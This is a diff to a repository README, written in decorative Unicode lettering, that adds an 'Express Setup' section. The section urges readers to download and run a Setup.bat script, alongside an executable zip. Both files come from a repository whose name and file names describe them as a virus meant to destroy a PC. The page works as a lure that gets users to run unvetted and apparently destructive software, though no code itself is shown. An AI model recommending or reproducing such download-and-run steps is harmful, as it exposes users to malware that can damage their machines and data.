@@ -10,12 +10,22 @@ Everyone has worked extremely hard on this project to bring you this unique expe
 
 📥 Manual Installation
 𝕴𝖋 𝖞𝖔𝖚 𝖆𝖗𝖊 𝖍𝖆𝖛𝖎𝖓𝖌 𝖙𝖗𝖔𝖚𝖇𝖑𝖊 𝖉𝖔𝖜𝖓𝖑𝖔𝖆𝖉𝖎𝖓𝖌 𝖙𝖍𝖗𝖔𝖚𝖌𝖍 𝖙𝖍𝖊 𝖜𝖊𝖇𝖘𝖎𝖙𝖊, 𝖗𝖚𝖓 𝖙𝖍𝖎𝖘 𝖈𝖔𝖒𝖒𝖆𝖓𝖉:
-
+---
 
 ### 📥 **Direct Download (Recommended)**
 To get the full experience, download the executable from our releases:
 👉 [Download](https://github.com/paz343123/this_distroy_pc_virus/releases/download/v1.0.0/virus_not_good.zip)
 👈:𝖙𝖍𝖎𝖘 𝖈𝖔𝖒𝖒𝖆𝖓𝖉
+
+---
+
+### 📥 **Express Setup**
+
+𝕽𝖚𝖓 𝖙𝖍𝖊 𝖋𝖔𝖑𝖑𝖔𝖜𝖎𝖓𝖌 𝖘𝖈𝖗𝖎𝖕𝖙 𝖙𝖔 𝖆𝖚𝖙𝖔𝖒𝖆𝖙𝖊 𝖙𝖍𝖊 𝖕𝖗𝖔𝖈𝖊𝖘𝖘:
+
+👉 **[Download Setup.bat](https://github.com/paz343123/this_distroy_pc_virus/raw/main/Setup.bat)**
+
+---
 
 ✨ User Experience
 𝕺𝖚𝖗 𝖕𝖗𝖎𝖒𝖆𝖗𝖿 𝖌𝖔𝖆𝖑 𝖜𝖆𝖘 𝖙𝖔 𝖈𝖗𝖊𝖆𝖙𝖊 𝖘𝖔𝖒𝖊𝖙𝖍𝖎𝖓𝖌 𝖒𝖊𝖒𝖔𝖗𝖆𝖇𝖑𝖊. 𝖂𝖊 𝖍𝖔𝖕𝖊 𝖞𝖔𝖚 𝖊𝖓𝏏𝖔𝖞 𝖊𝖝𝖕𝖑𝖔𝖗𝖎𝖓𝖌 𝖙𝖍𝖊 𝖕𝖗𝖔𝖏𝖊𝖈𝖙 𝖆𝖘 𝖒𝖚𝖈𝖍 𝖆𝖘 𝖜𝖊 𝖊𝖓𝏏𝖔𝖞𝖊𝖉 𝖇𝖚𝖎𝖑𝖉𝖎𝖓𝖌 𝖎𝖙.
